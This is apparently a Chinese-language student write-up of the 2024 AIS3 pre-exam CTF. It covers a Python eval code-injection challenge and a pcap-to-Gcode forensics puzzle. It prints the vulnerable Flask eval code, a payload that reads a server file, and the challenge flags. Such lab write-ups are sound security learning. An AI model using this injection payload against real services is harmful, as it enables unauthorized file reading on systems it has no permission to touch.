---
title: 2024 AIS3 Pre-exam Writeup
date: 2024-06-02 21:42:41
tags:
---
# Intro
請容我先自我介紹一下！我今年大一，在高中的時候並不是理工背景的學生，相反，我原本是打算去唸法律系的。但是在高三下的時候意外接觸到了CTF的資訊，自己稍微摸索了一下，也學了一點程式設計後發現自己對這個領域更為有興趣。可惜當時已經來不及報名學測的自然科目，我就下定決心要到成大不分系，利用他們的選課權利多修習資工系的課程。最終，我如願進到了成大，也在這將近一年的時間裡，修著和資工系一樣的課程，也更加地堅定了自己的選擇是正確的。

而進到成大後我也並沒有忘記自己當時的初衷，是因為對資安特別感興趣，才誘使我轉換到了這條跑道，所以我也報名了SCIST的課程，希望可以在資安領域有更多的成長。嚴格說起來，加上SCIST的期末考試，這次是我第二次正式的資安比賽。而這次的我又比上次(SCIST期末考)花了更多的時間在解題。這次三天的賽程，我幾乎是除了吃飯睡覺以外的時間，都在解題(三點睡覺八點起床💤)，可惜最後還是一直卡在一些想不出來的點，所以解出來的題目還是有點少。希望在我今年暑假的修煉過後，下次參賽可以有更好的表現！

(這次的參賽紀錄我也有放在個人網站上，等審查結束後打算公開，可以透過[這個連結](https://cx330.tw/CyberSec/CTF/2024-AIS3-Pre-exam-Writeup/)訪問，密碼`2024AIS3`)
# Web
## Evil Calculator
> 這是一題command injection的題目

先觀察題目，打開F12的開發者工具，隨便輸入點東西看看它的運作。這邊我們先在計算機上按下3+3。

![image](https://hackmd.io/_uploads/SydoCk94C.png)

在圖中我們可以看見，他其實是傳了一個request給後端服務器，後端服務器會去執行這個計算，並且把結果回傳給前端。這邊的payload長這樣:
```json=
{expression: "3+3"}
```
我們可以發現他就是執行了後面的3+3。這時候我們再去看題目給的`app.py`文件，就可以更加地確定我們的想法是對的。如下:
```python=
@app.route("/calculate", methods=["POST"])
def calculate():
    data = request.json
    expression = data["expression"].replace(" ", "").replace("_", "")
    try:
        result = eval(expression) # 這裡就是我們要inject的地方！
    except Exception as e:
        result = str(e)
    return jsonify(result=str(result))
```
所以我們只要把`{expression: "3+3"}`中的`"3+3"`替換成我們要注入的命令就可以被執行了。

我這邊是用Chrome的插件HackBar去送請求，本來想要直接`cat ../flag`，但我發現他的源碼中會把空格給取代掉，像這樣
```python=
expression = data["expression"].replace(" ", "").replace("_", "")
```
所以換了種寫法，payload如下:
```json=
{expression: "''.join([open('../flag').read()])"}
```
然後我們就得到flag了！

![evil_calculator_flag](https://hackmd.io/_uploads/S1DlyecE0.png)

(圖片的字可能有點小，flag我放在下面)

```
 AIS3{Welc0me_to_AIS3_PreExam_2o24!}
```

(我在寫writeup的時候才想到，原來題目叫做evil calculator是因為作者給了個小提示告訴我們源碼中的eval函式有問題😶)

# Crypto
# Reverse

## The Long Print
# Pwn
# Misc
## Three Dimensional Secret
這題給了一個`capture.pcapng`，所以我們先用Wireshark把檔案給打開來，看看他葫蘆裡賣的是甚麼藥。![image](https://hackmd.io/_uploads/r1EEdx9VR.png)
在圖片中我們可以看到超級多的TCP封包，我一開始還不太知道接下來該怎麼做，但我在翻了一下[這本書](https://www.books.com.tw/products/0010884220)之後就找到解法了！

首先我們先對著這坨TCP封包點右鍵，會出現一個選項叫做Follow，如圖:

![image](https://hackmd.io/_uploads/SJkMtl5NA.png)

然後我們把它點下去，然後再選擇TCP Stream，就可以看到Wireshark所解析出來的內容，如下:

![image](https://hackmd.io/_uploads/SkGcFx5N0.png)

因為之前忘記在哪裡刷提的時候有寫過類似的題目，所以我知道這串看不懂的字其實是一個叫做Gcode的東西，它是用來控制工業中的一些自動工具機的代碼。因為太長了，所以我只放一小部分在下面。Gcode就長下面這樣。
```
G0 X171.826 Y145.358
G0 X171.773 Y144.928
G0 X171.082 Y142.074
G0 X171.877 Y141.336
G0 X172.029 Y138.178
G0 X172.802 Y136.983
;TYPE:WALL-INNER
G1 F1500 E2061.27916
G1 F21000 X173.166 Y136.922 E2061.89293
G1 X173.47 Y136.79 E2062.44409
G1 X173.747 Y136.571 E2063.03132
G1 X173.95 Y136.281 E2063.62001
G1 X174.046 Y135.929 E2064.22677
G1 X174.043 Y135.473 E2064.98511
```

既然已經知道了他是Gcode，我們就趕快來找一個線上的Viewer來看看他生做圓還是扁吧！我使用的網站是[這個](https://ncviewer.com/)。把那串代碼放上去後，就點一下圖中的Plot來看看！

![image](https://hackmd.io/_uploads/HJA09l9N0.png)

點下去後發現居然沒有東西，我直接愣在原地被硬控三秒鐘。難道是我想錯了嗎！！！在慌亂之中，我趕緊調整視角，終於發現了偷偷躲在旁邊的Flag，如下:

![image](https://hackmd.io/_uploads/SyqholcNR.png)

(然後因為我偷懶+怕打錯字所以用了OCR把它的文字題取出來)
```
AIS3{b4d1y_tun3d PriN73r)
```
# Forensics 
這次好像把Forensic的題目都放在Misc裡面了所以跳過這Part

# My Thoughts

# Reference
有鑑於我認為自己在資訊這個領域中，如果能有任何的成就或是進展，很大部分的原因都是站在了許多巨人的肩膀上，所以我會把比賽過程中用到的資源都放上來。

不僅僅是為了致敬及感謝，更要提醒自己，自己的不足及渺小。
- [駭客廝殺不講武德：CTF強者攻防大戰直擊](https://www.books.com.tw/products/0010884220)
- [2020/10/24 Web Security 基礎 題解](https://scist.org/blog/2020/10/27/2020%20SCIST%20Web/)
- [CTF Crypto RSA算法 入门总结（全）](https://blog.csdn.net/vanarrow/article/details/107846987)
- [CTF-RSA加密-1](https://blog.csdn.net/orchid_sea/article/details/134164177)
- [CTF-Crypto-RSA基本原理及常见攻击方法](https://blog.csdn.net/ISHobbyst/article/details/108918079)
- [CTF学习笔记——RSA加密](https://blog.csdn.net/qq_45198339/article/details/128741483)

已經盡力回想及搜尋有用到的資源，但可能還是會有些漏網之魚，還請見諒。